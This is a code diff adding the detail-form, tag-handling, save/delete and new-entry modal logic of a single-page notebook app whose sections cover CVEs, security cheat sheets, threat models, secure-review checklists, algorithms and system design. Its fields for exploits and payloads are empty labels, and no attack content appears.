+  editingId = id;
+  const s = SECTIONS[entry.section];
+ 
+  const icon = document.getElementById('detailIcon');
+  icon.style.background = s.color;
+  icon.innerHTML = `<i class="ti ${s.icon}" style="color:${s.iconColor}" aria-hidden="true"></i>`;
+  document.getElementById('detailSectionLabel').textContent = s.label;
+ 
+  document.getElementById('detailBody').innerHTML = buildDetailForm(entry);
+  bindTagsInput();
+ 
+  document.getElementById('detailOverlay').classList.add('open');
+  document.getElementById('detailPanel').classList.add('open');
+}
+ 
+function closeDetail(){
+  document.getElementById('detailOverlay').classList.remove('open');
+  document.getElementById('detailPanel').classList.remove('open');
+  editingId = null;
+}
+ 
+function buildDetailForm(e){
+  const tagsVal = (e.tags||[]).map(t=>`<span class="tag-input-chip"><span>${esc(t)}</span><span class="tag-rm" data-tag="${esc(t)}">×</span></span>`).join('');
+  let html = `
+    <input class="detail-title-input" id="df-title" value="${esc(e.title||'')}" placeholder="Title"/>
+    <div class="detail-field"><div class="field-label">Subtitle</div><input class="field-input" id="df-subtitle" value="${esc(e.subtitle||'')}" placeholder="One-liner description"/></div>
+    <div class="detail-field"><div class="field-label">Tags</div>
+      <div class="tags-input-wrap" id="tagsWrap">${tagsVal}<input class="tag-text-input" id="tagTextInput" placeholder="Add tag + enter"/></div>
+    </div>`;
+ 
+  if(e.section==='cve'){
+    html+=`
+      <div class="select-row">
+        <div class="detail-field"><div class="field-label">Severity</div>
+          <select class="field-input" id="df-severity">
+            ${['critical','high','medium','low','info'].map(s=>`<option ${e.severity===s?'selected':''}>${s}</option>`).join('')}
+          </select></div>
+        <div class="detail-field"><div class="field-label">Affected Systems</div><input class="field-input" id="df-affected" value="${esc(e.affected||'')}"/></div>
+      </div>
+      <div class="detail-field"><div class="field-label">Description</div><textarea class="field-textarea" id="df-description" rows="4">${esc(e.description||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">PoC / Exploit</div><textarea class="code-area" id="df-poc" rows="4">${esc(e.poc||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Mitigation</div><textarea class="field-textarea" id="df-mitigation" rows="3">${esc(e.mitigation||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">References</div><input class="field-input" id="df-references" value="${esc(e.references||'')}"/></div>`;
+  } else if(e.section==='cheatsheet'){
+    html+=`
+      <div class="detail-field"><div class="field-label">Category</div><input class="field-input" id="df-category" value="${esc(e.category||'')}"/></div>
+      <div class="detail-field"><div class="field-label">Commands / Payloads</div><textarea class="code-area" id="df-content" rows="12">${esc(e.content||'')}</textarea></div>`;
+  } else if(e.section==='threatmodel'){
+    html+=`
+      <div class="detail-field"><div class="field-label">System Type</div><input class="field-input" id="df-systemType" value="${esc(e.systemType||'')}"/></div>
+      <div class="detail-field"><div class="field-label">Assets</div><textarea class="field-textarea" id="df-assets" rows="2">${esc(e.assets||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Threats (STRIDE)</div><textarea class="field-textarea" id="df-threats" rows="6">${esc(e.threats||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Mitigations</div><textarea class="field-textarea" id="df-mitigations" rows="6">${esc(e.mitigations||'')}</textarea></div>`;
+  } else if(e.section==='securereview'){
+    const items = (e.checklist||[]).map((item,i)=>`
+      <div class="checklist-item${item.done?' checked':''}" id="cli-${i}">
+        <input type="checkbox" class="checklist-cb" ${item.done?'checked':''} onchange="toggleCheck(${i},this.checked)"/>
+        <span class="checklist-label">${esc(item.text)}</span>
+      </div>`).join('');
+    html+=`
+      <div class="detail-field"><div class="field-label">Language / Framework</div><input class="field-input" id="df-language" value="${esc(e.language||'')}"/></div>
+      <div class="detail-field"><div class="field-label">Checklist</div>${items}
+        <div style="margin-top:8px;display:flex;gap:6px">
+          <input class="field-input" id="newCheckItem" placeholder="Add checklist item…" style="flex:1"/>
+          <button class="icon-btn" onclick="addCheckItem()" style="flex-shrink:0"><i class="ti ti-plus" aria-hidden="true"></i></button>
+        </div>
+      </div>`;
+  } else if(e.section==='dsa'){
+    html+=`
+      <div class="detail-field"><div class="field-label">Complexity</div><input class="field-input" id="df-complexity" value="${esc(e.complexity||'')}"/></div>
+      <div class="detail-field"><div class="field-label">When to use</div><textarea class="field-textarea" id="df-when" rows="2">${esc(e.when||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Template / Code</div><textarea class="code-area" id="df-template" rows="14">${esc(e.template||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Go-to example problem</div><input class="field-input" id="df-example" value="${esc(e.example||'')}"/></div>`;
+  } else if(e.section==='sysdesign'){
+    html+=`
+      <div class="detail-field"><div class="field-label">Scale / Requirements</div><textarea class="field-textarea" id="df-scale" rows="2">${esc(e.scale||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Core Components & APIs</div><textarea class="field-textarea" id="df-components" rows="5">${esc(e.components||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Tradeoffs & Decisions</div><textarea class="field-textarea" id="df-tradeoffs" rows="4">${esc(e.tradeoffs||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Scalability Patterns</div><textarea class="field-textarea" id="df-scalability" rows="4">${esc(e.scalability||'')}</textarea></div>`;
+  } else if(e.section==='codereview'){
+    html+=`
+      <div class="detail-field"><div class="field-label">Type</div>
+        <select class="field-input" id="df-type">
+          ${['pattern','debug','anti-pattern','fix'].map(t=>`<option ${e.type===t?'selected':''}>${t}</option>`).join('')}
+        </select></div>
+      <div class="detail-field"><div class="field-label">Pattern / Code</div><textarea class="code-area" id="df-pattern" rows="10">${esc(e.pattern||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Root Cause</div><textarea class="field-textarea" id="df-rootCause" rows="2">${esc(e.rootCause||'')}</textarea></div>
+      <div class="detail-field"><div class="field-label">Fix / Recommendation</div><textarea class="field-textarea" id="df-fix" rows="3">${esc(e.fix||'')}</textarea></div>`;
+  }
+ 
+  html+=`<div class="detail-field"><div class="field-label">Notes</div><textarea class="field-textarea" id="df-notes" rows="3" placeholder="Additional notes…">${esc(e.notes||'')}</textarea></div>`;
+  return html;
+}
+ 
+function bindTagsInput(){
+  const wrap = document.getElementById('tagsWrap');
+  const input = document.getElementById('tagTextInput');
+  if(!wrap||!input) return;
+ 
+  input.addEventListener('keydown', e=>{
+    if((e.key==='Enter'||e.key===',')&&input.value.trim()){
+      e.preventDefault();
+      const tag = input.value.trim().replace(/,/g,'');
+      addTagToWrap(tag);
+      input.value='';
+    }
+    if(e.key==='Backspace'&&!input.value){
+      const chips=wrap.querySelectorAll('.tag-input-chip');
+      if(chips.length) chips[chips.length-1].remove();
+    }
+  });
+  wrap.querySelectorAll('.tag-rm').forEach(rm=>{
+    rm.onclick=()=>rm.closest('.tag-input-chip').remove();
+  });
+  wrap.onclick=()=>input.focus();
+}
+ 
+function addTagToWrap(tag){
+  const wrap=document.getElementById('tagsWrap');
+  const input=document.getElementById('tagTextInput');
+  const chip=document.createElement('span');
+  chip.className='tag-input-chip';
+  chip.innerHTML=`<span>${esc(tag)}</span><span class="tag-rm" data-tag="${esc(tag)}">×</span>`;
+  chip.querySelector('.tag-rm').onclick=()=>chip.remove();
+  wrap.insertBefore(chip,input);
+}
+ 
+function getCurrentTags(){
+  return [...document.querySelectorAll('#tagsWrap .tag-input-chip span:first-child')].map(s=>s.textContent.trim()).filter(Boolean);
+}
+ 
+function toggleCheck(idx, val){
+  const entry = state.entries.find(e=>e.id===editingId);
+  if(entry&&entry.checklist&&entry.checklist[idx]){
+    entry.checklist[idx].done=val;
+    const row=document.getElementById('cli-'+idx);
+    if(row) row.className='checklist-item'+(val?' checked':'');
+    save();
+  }
+}
+ 
+function addCheckItem(){
+  const input=document.getElementById('newCheckItem');
+  const text=(input.value||'').trim();
+  if(!text) return;
+  const entry=state.entries.find(e=>e.id===editingId);
+  if(!entry) return;
+  if(!entry.checklist) entry.checklist=[];
+  entry.checklist.push({text,done:false});
+  save();
+  input.value='';
+  openDetail(editingId);
+}
+ 
+function saveEntry(){
+  const entry = state.entries.find(e=>e.id===editingId);
+  if(!entry) return;
+  const g = id => { const el=document.getElementById(id); return el?el.value:''; };
+  entry.title = g('df-title');
+  entry.subtitle = g('df-subtitle');
+  entry.tags = getCurrentTags();
+  entry.notes = g('df-notes');
+ 
+  if(entry.section==='cve'){
+    entry.severity=g('df-severity');entry.affected=g('df-affected');
+    entry.description=g('df-description');entry.poc=g('df-poc');
+    entry.mitigation=g('df-mitigation');entry.references=g('df-references');
+  } else if(entry.section==='cheatsheet'){
+    entry.category=g('df-category');entry.content=g('df-content');
+  } else if(entry.section==='threatmodel'){
+    entry.systemType=g('df-systemType');entry.assets=g('df-assets');
+    entry.threats=g('df-threats');entry.mitigations=g('df-mitigations');
+  } else if(entry.section==='securereview'){
+    entry.language=g('df-language');
+  } else if(entry.section==='dsa'){
+    entry.complexity=g('df-complexity');entry.when=g('df-when');
+    entry.template=g('df-template');entry.example=g('df-example');
+  } else if(entry.section==='sysdesign'){
+    entry.scale=g('df-scale');entry.components=g('df-components');
+    entry.tradeoffs=g('df-tradeoffs');entry.scalability=g('df-scalability');
+  } else if(entry.section==='codereview'){
+    entry.type=g('df-type');entry.pattern=g('df-pattern');
+    entry.rootCause=g('df-rootCause');entry.fix=g('df-fix');
+  }
+ 
+  save(); renderCards(); renderTagFilter(); closeDetail();
+}
+ 
+function deleteEntry(){
+  if(!confirm('Delete this entry?')) return;
+  state.entries = state.entries.filter(e=>e.id!==editingId);
+  save(); renderCards(); renderTagFilter(); updateCounts(); closeDetail();
+}
+ 
+// ── New entry modal ──
+function openNewModal(){
+  const sel=document.getElementById('newSection');
+  sel.value=currentSection;
+  updateNewForm();
+  document.getElementById('modalOverlay').classList.add('open');
+  setTimeout(()=>document.getElementById('newTitle').focus(),50);
+}
+function closeModal(){ document.getElementById('modalOverlay').classList.remove('open'); }
+function updateNewForm(){
+  const s=document.getElementById('newSection').value;
+  const extra=document.getElementById('newExtraFields');
+  if(s==='cve'){
+    extra.innerHTML=`<label>Severity</label><select id="newSeverity">${['critical','high','medium','low','info'].map(v=>`<option>${v}</option>`).join('')}</select>`;
+  } else if(s==='cheatsheet'){
+    extra.innerHTML=`<label>Category</label><input type="text" id="newCategory" placeholder="e.g. recon, payloads, privesc"/>`;
+  } else if(s==='securereview'){
+    extra.innerHTML=`<label>Language / Framework</label><input type="text" id="newLanguage" placeholder="e.g. Python, Node.js"/>`;
+  } else {
+    extra.innerHTML='';
+  }
+}
+function createEntry(){
+  const section=document.getElementById('newSection').value;
+  const title=(document.getElementById('newTitle').value||'').trim();
+  const subtitle=(document.getElementById('newSub').value||'').trim();
+  if(!title){ document.getElementById('newTitle').focus(); return; }
+  const entry={ id:Date.now(), section, title, subtitle, tags:[], notes:'', createdAt:new Date().toISOString() };
+  if(section==='cve') entry.severity=(document.getElementById('newSeverity')||{}).value||'medium';
+  if(section==='cheatsheet') entry.category=(document.getElementById('newCategory')||{}).value||'';
+  if(section==='securereview'){ entry.language=(document.getElementById('newLanguage')||{}).value||''; entry.checklist=[]; }
+  state.entries.push(entry);
+  save();
+  currentSection=section;
+  document.querySelectorAll('.nav-item').forEach(n=>{ if(n.dataset.section===section) n.classList.add('active'); else n.classList.remove('active'); });
+  document.getElementById('topbarTitle').textContent=SECTIONS[section].label;
+  closeModal();
+  renderTagFilter();
+  renderCards();
+  setTimeout(()=>openDetail(entry.id),50);
+}
+ 
+document.getElementById('modalOverlay').onclick=e=>{ if(e.target===e.currentTarget) closeModal(); };
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape'){ closeModal(); closeDetail(); }
+  if(e.key==='Enter'&&document.getElementById('modalOverlay').classList.contains('open')&&document.activeElement.tagName!=='TEXTAREA'){ e.preventDefault(); createEntry(); }
+});
+ 
+function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+ 
+// ── Init ──
+renderTagFilter();
+renderCards();
+updateCounts();
+</script>
+</body>
+</html>
